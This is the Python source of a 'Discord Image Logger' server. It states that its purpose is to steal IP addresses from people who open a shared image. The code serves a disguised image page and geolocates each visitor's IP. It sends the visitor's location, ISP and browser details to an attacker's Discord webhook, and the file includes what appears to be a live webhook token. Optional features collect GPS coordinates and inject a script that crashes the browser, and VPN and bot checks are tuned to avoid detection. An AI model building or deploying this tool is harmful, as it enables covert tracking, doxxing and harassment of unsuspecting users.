# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1140451597047054377/_FGmhOxAZ8_Bn0PNRf_TAPgdPOjt4oHhF9tve9j5FeHxkqlIL3GlBLW8AqgqY150xYkn",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
